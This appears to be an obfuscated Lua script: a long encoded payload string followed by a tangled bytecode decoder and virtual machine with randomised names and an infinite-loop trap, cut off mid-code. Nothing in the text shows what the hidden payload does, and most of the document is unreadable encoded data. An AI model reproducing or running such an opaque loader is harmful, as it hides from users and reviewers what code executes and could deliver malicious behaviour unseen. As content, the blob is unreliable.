-t84&1I>4DI4>cUvv(((rO>rU>4S1 U c&(48  8rSD>S>cD8 =(I6SIS* r?R1S8W_v11t>SUtcS8(rH(I->>H>I>>S-vv Sr c>1UAvU(S4vrc4rD1U c8(rUScU  rsD4r8DDtccD1vt-SW 4r18>rt1r>S-cIf>-S18>oUvI(84v>DU(v1pDID>D(v4-D3-4v1S4c( >r+D--144D1U>S>DIrv1 tAU1 1r>1U>U--8 j(141tS>8U7Srv>>-u8rQ1ID>U>cvv8 r(>4-Iv>(t4SI4U -Z l41DDUUc- v((1e>4St >rt1StcS v4r441t1SU8-0vI8>fU881M>N?>S-cv ( I4>1->vU8(4vD U=v4(141DUU>>  8rpD44cc> trS4v> S_88r114tUS-8v(vt>t4-88> tIS>v- v^ -I1>r-UvI(v4vDsUv c(>4IDSIIc  (44D1U>c1-vrc1 tAD- 1rD1UDS-v8 gc14>mS>S(eS4SS1-lvc+155>U-Svv( rt>4U(v>(r4SDSU cSr-41DrUU>r vr81LU4c1 4vS1-tvS Utr41It>UU-DNvI->_- 818oIU1Sr-v (cI4D(->S1(Smv1-U=c8(14rDUDScvv dDD4t(c> IrS1St - v(r1IRtU--8vE IGDWUV8>RrISDR- vVZ4r1>I-UvI(v4tDEUDv1 14tDSU1c  D44D1U>S>41rv1Dty-4 1r>1U>U-v8 u>14D4S>8U*S4S>t-/vt!1rI>U-Svv v4I>4UUv> -4SDvU S 8-411-UUcr vr 1e>H-v >LS1St1S 8*r4I4tISUvcGv4S>+S481(1> >SUvv  -I4>1->c>4n4v18UYS((14>DUtU3D  d D4>tc> UrSIStvS9v(r14ItUSS8vx I1t4-88>(DIS>v- v9 UI1DP-UvS(v48Dg>vSS(>4IDSIIc  (44IUU>c1-vrc1 t)D- 1rD1UDS>t8 }S14>=S>vSQSrv18-(vvd14W>Ut(vv vr >4U8v> 44SDvU -Z t411(UUcI vrr1E>9S1 >_i1St-S 8Fr4I4>SSU8r+vIc>NS481(1r(>S-4v (vI4>1->vU t4vDtU6cU(141DUU1>S 8rSD44cc> trS1Dt Sv-1rI1>tUDr8vX8IoD4D(8>k4IS>U- v4^4r1rr-Uv1(v4UDGtSv1 141DSUDc vI44D1U>-U8Drv1ttdSc 1rr1UDSS>8 C-14>8S>cILSrvDD-fvcP14(>Ut4vv8 4c>4U8v>(r4S1 U -78t411(UUcI v.>1KU4D> Dr41St>S 8-r441IrSU81yvIU>HUU8189Ic>S->v c I4>I->v4(S4UbiU(v4(1 1DUU-cv S84DrU1c>U(rS1ct - >Dr1IbtU-r8vA Iht4D88Ds4IS>c- v(Y4441--Uv1(vr8DK-4v18>zODSUDc  v441>U>-U81rv1ttySc 1WS1UtS-c8 2U14t1S>8UWSIv>--pvcF14(>U-4vv( r(>4U v>(>4SDcU S c-411%UU-I vr 1,U4S8 >r41StcS 8 r441DvSU81CvIU>#t>81 >Ir>S->v (SI4D8->v4  4vDUUytr(14DDUU-cv S84DrU1c>-trS1ct Sv-1rI1>tUDr8va8I<D,4t8>o4IS1r- vbG4r14r-Uv1(v4UD}UUv1vkUvDSU>c -t44DIU>-v SrU(Tt(c4 1c81Ut-Svc vc14> S>817Sr>> tdU8K14^>U-1vv  4%Iv(Uv>(44SrSU c((4r4D>U1>v cr 1EIWc1 DrU11>SS 87r4ISt>St8S&SI >vD18Ia>IUDN-vv8(NI4(v->vU(S4cD UEv4(14>DUUScv >r9D4U1c>8UrS1vt >(>8-i8tDU>1tc-v8ID4>4>t-Dvtjt4cvP( I1>>-UDI-cvD v-4ct(>4UDSI-D-U1c8(rr4-USUS88c_818trr>1ItSSv8 -a8(rIIS>vYSIS> -i84SD (>U-Ivv( 4H(c4(D4-rvD  rUcY v41D>UUttt8SC Sr-18 >,51StvS -(S1vjD>D8tr- 8tDcS481m>4> 8-vv (W4}>1->vU(S>ID U?v4(I4>D>USc>GtraD4U1cr Ur-1vt8S_8 v>1DtUSS8tQ I(t4-)UU}tIS>vUSvhXrI1D1rcvS(v4 DS-4v1(>4U-rUvc  ^4rD1U1cUvS8t1 toc4 1r>1rtSUv--Mi14t1S>8Uz-Iv>Uvt84j1I>>U-Svc( 4E>4U*tU(t4SDvU c)(r4111&ccS vr 1cU4c1 >(U.DtvS 8_r411tISUc1>MI >GS481?>It>S-1v (v 1>I->vU(S4vD8UsSLtt4>DUUScU  r&D4t U8 tr-1vt S* rr11DtUSS41& I?t4S18>lUIS>v-4v2V4I1>1-Uv-(v4Sr4-rv1(>4UDSUcc  #cSD1U>cU -rv1 tFc4 Ir>1UtSt(8 wn14t1-88UGSIvB(1rU8->8r(cIr>tUc4zDv-1v>(U t 8rxDSU-c8D>UrcS vr hcr1DIU1Sv DrUSc-4 S(jc>1t1 >D( >H--81d>IU4tI1>8U 8rTr44>IUU4vDrUQv4(18I(Ir DtUcSvI4141ttDSt tucSW8(r11>tU>r>-v8IL> S18>oU >mt4>Dv((I1>>-UvS(v4 >FDIvr(Yt1-t48Ic8Dt1r1U>c4 Srv1 I81>tccr8S3>Sv8v2014t1D4UUGSI-> -J84->8r(r--vv( 4U>4-1v>SUcc -4D1vU-cD UUUS( vr 1}I>1DUIct8 4v14t(--8(21SUvv0vI >RDv>c-U8141IIDvU8c 4r4 D(U vUD Ucv4(14>}crcDUU-c1D4tJc> UrS8Dr81t> r111tUSS8vS((-t4-18>iUIS414->ISrv>(t4(>>SSc((rr t1-Dc> >U-c  344D1U>>U>>8v1 tUc4 1r>ht?vIUc vD8-e>I(8Dt->r>Ut6Dtd>1t4--tvv( 4i>4-1v> U SDvUtcY(441 (4I1>UDc- 4Fvc1 rrU1StvI t(S-84AISU81YvI >21ItDc-8tRr4 v (-I4>1->t4-Dv- S4r1)vr4IDUUScv  rwD4U1c> Ur>1vt SVU(ScvvrISS8DT Ift4D1>SStvrHt4vD8/44 >>-UvSc- U  IrDt-r4UDrUvc  E8S (4D1vt>c1pvr(I} 1H81UtSSv-rS(8cw>I8>1-D8U%--2v4+1I>>UD-DtUSvr141 >DU>c8Iv1vDrt(cr(rrDcS rr 1sU4>8UrS1xtr11Dt1S 84rrIS8S&II >zS4D8-tv>((4-D -(v(((->v1(S4vD 4->rUtvrDDIrD4Ir1r StD>USUrtccSISSv4--1UU- c8-D1cU4 01->1eStS8- vcW4I1>>11>rUUv4(c-4ci(>4UDSI(D8Utc1DrU>cU Srv1 tQc4S1c>1UtSSvvvt-14t1S>c8dSIv> U c>T1ID>UtIvv( 4*14Urv>(t4SDcU -S(4k1IeUUc- vr81}>>c1v>WI1StcS 8(r41It>UUvcKvI8>:Sr81(cIU1S-Iv ((I4>I->SI(S4vI>Uevr(141DUUScv  MDD4U1c> UrS1St Sv-1rI1>tU188v%8IbD4-18>KIIS>U- v-o444-v-UvI(vrvDz-4v1(>?(DSUtc  -44D4U>c4?Irv1-t=S4 1rD1Ut-Sv8Sv41rt1S>vUbSIc> -vU1iII>>UI8vv(84214U1v>(I4SDUU S((4r4UvUUcI v(v1gU4c1 >((1SttS 8-r414t>S4(IfvI->nUv81iDIU>--vvSc4Ir>1->c4(S4cD Uvt1(I4>DU48cv 8rjI4I(c> IrS1Ut U  4(1vItUSD8v&-Iu1>S1c>(1IS>t- vc24a->>tUc>(v4-DWU8v1  4U1Ut(c  S441UU>cU S.SISthSc 1(D1UtSSvc oD14>8S>8r&S4(> U 8rB14 >UUFvv( 4s1sv v> (4SI1U cT(4r41IUUS3 vrS1eU4c181((1StrS c>r411t>->vSBvI4>sU181;>IUDUUIv (II41v->vU(SrS1rU<c1(1/UDUUScv8vZDD4tDc>8(rS1vt - rUr1I>tUUv8v0 IgDm8S8>(tIS1I- vH%444Ir-UcU(vhfDl-4v1 1rIDSt-c v>44D1U>cU >rv1ttA-( 1r>1UtS->8 =S14t1S>8t.Sr>Dr-Cv8Z1mU>U--vv t4,D 1>vD(U4S4 U c((4r&dUUtcS vvr1)Urc1v>8I1St>S 8vr44(t>UUc-ecIU>b-v81 tIUDU-Uv (-I41t->vU(Sbv1CUucc(1r(DUt8cv8vr(D4tvc>v(rS1vt -  rr1I8tU-r8vW IJD}-D8>( ISI(- vy{4I11S-UvI(v41DFU,v1 nDcDSU>c ct44DIU>cr SrU(kt(c4 1881Ut-Sv8Sv41rt1S>tcWSIc> toU8y14!>U->vv -4<14I(v>(44SD>U cr(4r4I-UUcI v(t1=U4c1v>( 1StDS 8-r441t>UU84uvIt>;-c81(>IU1S-Dv (-I4D8->vI(S}v18UAcc(1r(DUtDcvv 78D4t8c> rrSI8t S?U1rIIbtUS18vCtI)D4D(8>C4IS>>- S8u4_ >--Uv1(v UD2-rv18i4UD>I c8 /44T U>ct SrU(ht(c4 1c-1Ut-Svvv-I14> S>vDbSIv> -wUc,I40>U--vv(84}1wU1v>(44S1nU cZ(4C1I UUcI vrS1T>8c1v>_S1StDS 8-r44It>SU8tkvI>>RS481h>IU>SUUv (-I4D8->cl(S4v1SU*cv(141DUU-cv8v88Drt c>v rS1vt SE8tr1IBtUS-8vevITD4-D8>^4IS>>- v G4r11(-Uv1(v4UDQ> v1 641DSU>c -I44DIU>cU SrU(}t(c4 1c-1Ut-Svvv-I14> S>v16SIv> tOU8!14_>U-1vv(U4<Iv(Uv>(44S((U c((4k8D>U1>v cr 1Q4Dc1 DrU4SItS 8Sr4I,t>U>8S v(->#-v81(+IU>t-vSU((I4D ->>c(S4cD U4v4 X8UDtUScv-rr,DrU1c4-Sr-1vt >S 4rI1>t4-U8v= Ih>US18D}UIU>v-SU4LrI1>>U vS(c4 D:4Sv1(>4UD-Uvc  W44D1U>cU SrI1 tfc4 1X81UtSSv-8-cv EDU>-4S-vSmr-mv1.1I>>UD-DtUSvr141 >DU>c8IvIvD(U1c-D>tUcS vr ;(G8IYtt(UM1rcIvtI(404OtID>tStvc>+-r81N>IU4-4tDS-rr4r IDD>U8{vrSrcD1U8vr -rvcv8-rwD4U1tDtIS>88D >SUrS48-DU1(cvc)8crrI4tr-Dv>1v1rvZ(cI1>>-U>I-tcS(-48D>tZ4UDDUvc  }c4(r4D1vt rv1StMc4 1-( trrIU8 jS14t1S>-D-cv aUIt>c8-I>>U-ScSUr4g>4-1c (U4SDvU (t(441D>UtcS Sr 1S-cc1 >rU1DtvS88Krr11t4DS8-YvI >cS48IH>I1rv-cv ({FU>1-DvU US(D UEv4  4>DUUScv4DrjD4U1cD UrU1vD >c 4r11>tUSS8I< r+48S18>uUIS>v-8vy(v18>>-UvS8>4 D(-4vI(>41WvUcc  T(vD1UDcU8U-(1 tBc48 r>1UtSSvrD9&14t1SD8U_UIv1 Dc84b1I>>U-SvI( !Nr8-1v>(U4SDvUcc, vI8D>UUcSv>r 1(U4cI >r1(vtcS 8E v11tDSUvUU(I >;S4v <>IU>S-v5D(?I4>1-DvU(U4vI 1cv4(14>DUUScI  (Qg8U1c> UrS1vt-S}8vIc1>tUSSv19 I(t4S18>_1 v>c- v3 SI1>D-Uv>S 48Ds-4- (>4tDStS1r o44D1t=cU Srv1 ctc4 1r>1ttSSS8  #(8t1S>8UnSIv>D-9c4c(I>>U-Svv( 4v>4U  8(U4SDv>(c;(r41D>UUc>- r815U4-D >rt1StUDY8(r41116SU8-Mv4v(IS481X>I4>S-vv (H>->1->vU(-4vDvUYS4S(4>DUUScv  rtD4>1tr UrS1vt SC8ir1IL-rSS8v/ rSt4SI8>otIS>U1xv(O4I1IZ-Uv-(v4Sr4-rv1(>4UDSUcc 8 SDD1U>cU Irv1 tdSwSvr>1ttSSv8 YZ14t1-S8U_SIv>v-_8r21I4rS--vv( 4,>4-Iv>(Uv4DvU c3(r41D>UUcS cr 1NU4-W >rU1Stv-w8er4114dI(>vSU(U/t4o>r-4(DE4II>4-vI4D-->vU(S8X (48>rUU8> v4-1IU-S D4t c> UrS 8r(>IUrSc8UtUSI8vb IM44IUtDU(8D(S4cvk( I1>>-U>I-cvr(c-4cv(>4UDS1SD8t8c8}14D1>t>rv1-t_c4 1S> trrIS>cxnI(t1S>8Uvrv-48-Gv-71I>>UDt>1-8c hrIrD4-IcUDvt c!(4417 rI18UcS{ rr-1n-1S-8cKUD t(-Nv*t>-S8S!vI 4-I8DEv48I(tI->--4v !I4UD1Ut4vDDUjv4(18 (I4-1ytScU2P4I11 Ur41vt S3-4SD8I0(I>tI-(84t4-S8>lUIS4-I8>4c(vD(S4v>r-Uv-DRU-v1(>4U(c48t-U4c8 tr8DIttrv1Dtbc4 1-(8-bU1r>c-x rrr1r8UzrIv> -mUDSIv((SIrDUU-vv(8-rvtt-1S4DrD(8cr rDDUUcS >r 1JU4trtSS( D: IScSr411t>->1I%vI >m-c81m>IUDUUcv ((I4D(->vU(Snv1 Uevr(14DDUtScvv r(D4UIc> trS1-t Uj rr11DtUS-8v((IdD4S48>+tIS>c- cv^4r1D8-Uv-(v48DkUtv1(>(,DSUcc   44D1U>cUv(rv1 t+c4 1r11Ut>D 885G14DrS>8tWSrvD -Qv861I4>U-4vv v>>>4U8v>(44SDvU c?8-41DrUUcI vrv1Btvv8 >rI1S>vS 8(r41It>S1UvQcI >j-481BDIU>>1 v8(_I41r->vt(S_v1 U_c8(144DUU-cv8vD>D4t8c>8vrS1vt Suv-r11rtUSI8v<vIl>vc88>_IISD>- v(}4II>>-1tv(c4 DQtvv1(D4UD>I c8 B44IrU>ct S(vb-tmS8 1r41U>?Svc cc14>(S>8IdS4(> U vtY14n>U-Dvv( 4s14-rv>(44SD>U cv(4P11tUUc1 vrU1<tbc1v>g 1St>S 8Sr4Ict>UU8DdvIU>6-v81(vIU1SU1v (SI4D ->cc(S4v(kU(c8(14rDUU1cvv 8cD4t(c> IrSIct USc4rI1rtUUt8vi8I*D<S184cSI->v- S8.4II>>>UU (c4SDdU1v1 I4UD1tSc  A441SU>ct SrS1 tv>1 Ir>1U>MSv88y!14evS>8UBSIc> -K84V1I>>U-Svv(U4:>4-1v>(14SDvU >sU>vI88UUSt vr 174v1ct1S18Drc14-tS1815rI1U8Scv*/(Ic>(-1IU>>-vv (fvcWI4->I(SrCD U)v4S4c8(r441USccr 1y#11t-S 1vt1SB 4r1((rII>U-S-v (vIctISIISDE- voT4 r_r4S>>crv- t181 -rcS >t4c  Q44D14UcU Srv1 tEc4 1(>IUtSSv8 %O14tIS>8U( Iv> -:v6g1ID>U-S> ( 4+>4-Iv>(U4SDv>(c((441DDUUc- vAv8IU4c1 >rD1StvS c&,411t>SU8SkvI->CUAAS.>I>>S-Sv (_I4>1-8vU(S4vDvUzcp(1_>D1UScv  raD4t c> U(n1ctvST rr11>tU-Uv8% I8t4-&8>PUIS>vUcv3( I1>>-UvS(vrvD--4c((>4DDSUvc  %r4D1U>cU Drv18t2-Avtr>1UtSS-8 iK14D1UB8U*SIv> -Mv8h141D--SvS( 4 >4-1v>(UIrDvU c? i41D1UU-S Dr 10U4c1 >r41Stv>48j/g11t>SU8Sgv4vD1S48r2>I1>S-vv (src>1-4vU(S4vD UpS0 k4>DIUSc-  rKD4U1S( UrS1vt-S: rr11>>vSS8v, I(t4S18>9UIS>v- v:ArI1>>-UvS(t4 DJ-4D1-Ivt  r3cS ,44D1t1Ic Srv1 t(c4 1r>1>14Sv880N14t1S>8UYS43> -T84!4I>>t-Svv->4;>4-1vD(U4SDvU c((441D>>UcS vr 1XtUc1 >rUEIrtISU8S884(JI(ttStI >vS481^> {xDIc>S(l4->1->vUS8vc(t44D-tJcr(14Dc-8 ScIIz1I41>t-.vt S( 4r11>>(St8v5 I5t4S18>wUIS>-R(rDSYD1cUD>Uvcv4 Dc-4v1(>8D S4c1tU444D4U>cU SvU( tAS  1r>1UrI1ctrSc14>8S>8UOS v&4I(D--(v1(D-Scg( 45>4I8>DU(c>r>r(1 S(cv 8rvD> vrt1XU4c1S4cI8t6UIvtr--11>tSU8SJv8S7(4 tIc18I(848DS-c 8  IrDSU>4vDIUzv4(18S -4tDcU4vB >4II8UISU1-t Sd 4r11>?UrI-vY Ict4S18>vIv1Lt4lDvx44S>>-UvScScv(t4 D8-r8S(DrUUv Pr4D1U>cUS4St rr(11tDS8 14UI8>(-v(4rII1>1fS4c> -n84c48r(U4 >I-cv(  4(>4SDc> 8rvD(Ucc(D>t8cS vr _44r14trS18c4DI(> S>8CtI48Uv-4D((UIS4S1>IUDh-vv (a v(c41>IStvt vrSD8U44>D4UScv  88ovr4DDtccD1vtIS^ 4r1WI^21-> St8cr(I1tD-rvv>v-DvHO4I14I4#>-USv8(8r D(U14UDtUvc  Pc1 (L(cD Srv1 t7c4 1r>:UtSS>8 kl14((IU>US-8-MI-x8rH1I>>UU}v-( 4T>4-1v>(UISr8U cU(441D>IU1ct-cD8vr-1DtUS 1StvS v -D11t>SUv4WvI >kU4U(6>IU>S-vv  DI4D4vYvU(-4v1UU6v4(1r114UScS  r-D4U1c>8>&v1vtcS!8 r11>tU-UvSN Ivt4UD8>KUISDSUDv)(8I1D7-UvS(vrvDI-4c (>44DSUvc 8 A,D1t(cU 1rv1 tj-OUtrDI7tSU88 fk14>4S48UsrIv>U-L84L141D1-Sv4( 4S>4-1v> >4>DvUIc= v41D>UUSU8(r 11U4-D >rU1StvSS8^r411>SSU8U%vr rcS48Il>IU>Stvv   4v>1-1vU Q4vD UKS4 U4>D>UScS  rDD4>1S; UrU1vtvSy8Ir14>>4SS8S& I t4US8> U41>v-vv#(/I1DI-USS(I4 D -4v4(>:UDSUvDo (4rD1UDcU Urv4 Icc4 Ir>1ttSS-8 )49Ut1->8U (Iv>8-e8rd1I4rS--vv( rD>4-Iv>(18vDcU cxUv41DDUUSU>(r 1(U4SS >rU1SDvr,8frr11tDSUv(_vr >vS48I.>It>SU8v 87rE>1-DvU(-4v11U#S4884>DtUScc  e8D4t4S( UrU1v>>S! 4r14>>1SS8S? I t4U-8>(>4S>v-cvy vI1>>-UcUI>4 Dv-4c8(>4UDStSc- Er8D1U4cU SrvIvtcc48 r>4-tSSv8 ( 4St1-(8Uy1Iv> -gcb(II>D.-Sv>( 4G>4U4c1(U4rDvUUcT(44111ttcS 4r IrU4c1 >f>tftvSI8Vgv11t>SUvU14I >1S4v !>IU>SUS(I(H4D>1U?vU(S4v1vtUv4 >4>I-UScv  r#ISU1c1 Uhv1vtvSX84+41>ttSSv1Q I t4S1c8mUI->v- v.;rI1>>t(vS(S4 D_-4v4(>4U1IUvcc z44D1U1cUcS8h18t8c48Ir>4(tStvS>V(I(t1- 8U(DIvD -U84}4I>1--Sv-( (B1 -1v1(Ub Dv>dcd 4rtD>UtcSv8r 1 U4S48>rU1UtvS18%r411D>-18ShSI > S48I;>4>>4-vvS(nr >1->vU(SIID U v4 +4>D>US-v vrH1ZU1c1 Uk 1v>vD> 4gX1>>>SS8v= I0trS181NUI>>v-vvN 44v>>->vS(S4 D1-4c4(44UD>UvSK d44D1U>SU SrS1 tvc4 4r>4U>8Sv8vliIot1U(8U(U4 > -v84 tI>>U-SvvrU4dD8-1vD(U4SDvU Sv(4rzD>UIcS vr 1ztIc1 1rU1StvS88xr4I>t>S>8SpvI >(S481ErIU>t-vv (f4#>1->cr(S4UD Uev4(44>4UUUcv Srd1rU1-8 U Sr1t8Sv 4Bv1>>ISSvv%-I{>(S1ct;UI>>v> ccn4Ir>>tvvS(t4 1YUcv1(14UIcUvcc OGbIUU>cD Sr41 tyc4v1ND1UttSv8c0J1rt1-1v uSIt> Uv84!1I>>USrvv(c49D8-1v1(U:SDIU c8(44rD>tvcS8Sv11it8c181rU1StvS 8 r41rt>SI8SXSI 1_US81bIIU>t-vv4(BrPDU->vI(Sr D Uov4(1r1DUUtcv -r;1.U1->8trS1-t S8 4(81>>>U(8vR-I{DDS18>%UIS-4- vS<4I4>>-UvS(v1SDPU8v1 X4UDSUvc  r44DrU>cU Src1 > SI 1rI1U>PSv8 <F44DSS>8D=SI-> -D84 1rS>U-tvv(c4<DI-1S> 84SD-U c8(42SD>>US> vrc1at(c1 1rU4S>vS 88r41rt>-c8SkvI4>3-(81M1IU>--vvSc4Ir>1->D((S4cD t 1D(14DDUUrcv  r=D4SSc> >rS1vt S2 4r1IStUS-8vOvIftrS18>-+IS>v- v(p4I1>>-UvS(v4 DF");local r=0;u.ZMghJvgm(function()u.hrywzobE()r=r+1 end)local function t(t,c)if c then return r end;r=t+r;end local c,r,h=f(0,f,t,o,u.SvfeWklw);local function d()local c,r=u.SvfeWklw(o,t(1,3),t(5,6)+2);t(2);return(r*256)+c;end;local b=true;local b=0 local function j()local t=r();local r=r();local n=1;local e=(c(r,1,20)*(2^32))+t;local t=c(r,21,31);local r=((-1)^c(r,32));if(t==0)then if(e==b)then return r*0;else t=1;n=0;end;elseif(t==2047)then return(e==0)and(r*(1/0))or(r*(0/0));end;return u.XoeKobdr(r,t-1023)*(n+(e/(2^52)));end;local _=r;local function p(r)local c;if(not r)then r=_();if(r==0)then return'';end;end;c=u.Aakfjpqx(o,t(1,3),t(5,6)+r-1);t(r)local t=""for r=(1+b),#c do t=t..u.Aakfjpqx(c,r,r)end return t;end;local _=#u.LFlgdblB(a('\49.\48'))~=1 local t=r;local function tv(...)return{...},u.iSAuKFnY('#',...)end local function nv()local o={};local b={};local t={};local a={o,b,nil,t};local t=r()local s={}for e=1,t do local c=h();local r;if(c==1)then r=(h()~=#{});elseif(c==3)then local t=j();if _ and u.EHZJwPJy(u.LFlgdblB(t),'.(\48+)$')then t=u.nqcu_dOB(t);end r=t;elseif(c==0)then r=p();end;s[e]=r;end;for a=1,r()do local t=h();if(c(t,1,1)==0)then local f=c(t,2,3);local h=c(t,4,6);local t={d(),d(),nil,nil};if(f==0)then t[n]=d();t[l]=d();elseif(f==#{1})then t[n]=r();elseif(f==k[2])then t[n]=r()-(2^16)elseif(f==k[3])then t[n]=r()-(2^16)t[l]=d();end;if(c(h,1,1)==1)then t[e]=s[t[e]]end if(c(h,2,2)==1)then t[n]=s[t[n]]end if(c(h,3,3)==1)then t[l]=s[t[l]]end o[a]=t;end end;a[3]=h();for t=1,r()do b[t-(#{1})]=nv();end;return a;end;local function lv(c,r,t)local e=r;local e=t;return a(u.EHZJwPJy(u.EHZJwPJy(({u.ZMghJvgm(c)})[2],r),t))end local function j(m,a,h)local function lv(...)local d,p,_,cv,b,r,o,rv,g,y,k,c;local t=0;while-1<t do if 3>t then if 0<t then if t~=-1 then repeat if 2~=t then _=f(6,38,3,50,m);b=tv cv=0;break;end;r=-41;o=-1;until true;else _=f(6,38,3,50,m);b=tv cv=0;end else d=f(6,25,1,36,m);p=f(6,54,2,31,m);end else if t<=4 then if t>=1 then repeat if 4>t then rv={};g={...};break;end;y=u.iSAuKFnY('#',...)-1;k={};until true;else y=u.iSAuKFnY('#',...)-1;k={};end else if t~=4 then repeat if 5<t then t=-2;break;end;c=f(7);until true;else t=-2;end end end t=t+1;end;for t=0,y do if(t>=_)then rv[t-_]=g[t+1];else c[t]=g[t+1];end;end;local t=y-_+1 local t;local f;local function _(...)while true do end end while true do if r<-40 then r=r+42 end t=d[r];f=t[z];if 180>f then if 89>=f then if 44<f then if 66>=f then if 55>=f then if 50<=f then if f<53 then if f<51 then c[t[e]]=c[t[n]]/t[l];else if f>48 then for h=41,88 do if 51<f then for f=0,6 do if f>=3 then if f<5 then if 3~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f>3 then for h=18,74 do if 5~=f then c[t[e]]=c[t[n]][t[l]];break;end;c[t[e]][c[t[n]]]=c[t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];end end else if 0<f then if-1~=f then for h=17,63 do if f<2 then c[t[e]][c[t[n]]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end break;end;if(c[t[e]]<=c[t[l]])then r=r+1;else r=t[n];end;break;end;else if(c[t[e]]<=c[t[l]])then r=r+1;else r=t[n];end;end end else if 53>=f then local u,k,y,_,p,f,h,j,m,a;for f=0,4 do if 1>=f then if-2<f then repeat if 1~=f then f=0;while f>-1 do if 2>=f then if f<1 then u=t;else if f>0 then for t=42,64 do if 2~=f then k=e;break;end;y=n;break;end;else k=e;end end else if f<5 then if 3==f then _=u[y];else p=u[k];end else if f~=1 then repeat if 6>f then c(p,_);break;end;f=-2;until true;else c(p,_);end end end f=f+1 end r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end else if f>2 then if 3<f then if(c[t[e]]~=t[l])then r=r+1;else r=t[n];end;else h=t[e]c[h](s(c,h+1,o))r=r+1;t=d[r];end else h=t[e]j,m=b(c[h](s(c,h+1,t[n])))o=m+h-1 a=0;for t=h,o do a=a+1;c[t]=j[a];end;r=r+1;t=d[r];end end end else if 50<=f then for h=22,66 do if 55~=f then for f=0,7 do if f<=3 then if f>=2 then if f>=-2 then repeat if f<3 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if 0<f then c[t[e]]={};r=r+1;t=d[r];else c[t[e]]={};r=r+1;t=d[r];end end else if f>5 then if 7~=f then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]][t[n]]=c[t[l]];end else if f~=0 then repeat if 5>f then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end end end break;end;if(t[e]<c[t[l]])then r=t[n];else r=r+1;end;break;end;else if(t[e]<c[t[l]])then r=t[n];else r=r+1;end;end end end else if f>=47 then if f<48 then for l=0,6 do if 3>l then if 1<=l then if l>=0 then repeat if 2>l then c(t[e],t[n]);r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end else if 5<=l then if 6==l then c(t[e],t[n]);else c(t[e],t[n]);r=r+1;t=d[r];end else if 3<l then c(t[e],t[n]);r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end end end end else if 49>f then local s;for f=0,4 do if f<2 then if f<1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end else if f>2 then if f>=2 then repeat if 4~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end else local f;for o=0,6 do if 2<o then if 4>=o then if o>=2 then repeat if o<4 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 5~=o then f=t[e]c[f](s(c,f+1,t[n]))else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if o>=1 then if o~=-1 then repeat if o~=2 then c(t[e],t[n]);r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end end end end else if 46>f then local f,h;for o=0,6 do if o<3 then if o>0 then if 0<=o then for l=42,60 do if o>1 then f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];break;end;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end else f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];end else if o>4 then if o>=3 then for a=20,98 do if o>5 then f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];break;end;f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;else f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];end else if 4~=o then f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end end end end else local o,u,b,k,a,f,_;for f=0,6 do if f<3 then if 0>=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if-3<=f then for s=35,78 do if 2~=f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f>=5 then if 1<f then repeat if f<6 then f=0;while f>-1 do if 2<f then if f>=5 then if f==6 then f=-2;else c(a,k);end else if 2~=f then repeat if 3~=f then a=o[u];break;end;k=o[b];until true;else k=o[b];end end else if f>0 then if f>=-1 then for t=45,80 do if f<2 then u=e;break;end;b=n;break;end;else u=e;end else o=t;end end f=f+1 end r=r+1;t=d[r];break;end;_=t[e]c[_]=c[_](s(c,_+1,t[n]))until true;else f=0;while f>-1 do if 2<f then if f>=5 then if f==6 then f=-2;else c(a,k);end else if 2~=f then repeat if 3~=f then a=o[u];break;end;k=o[b];until true;else k=o[b];end end else if f>0 then if f>=-1 then for t=45,80 do if f<2 then u=e;break;end;b=n;break;end;else u=e;end else o=t;end end f=f+1 end r=r+1;t=d[r];end else if f~=-1 then repeat if 4>f then c(t[e],t[n]);r=r+1;t=d[r];break;end;f=0;while f>-1 do if f>=3 then if 5>f then if 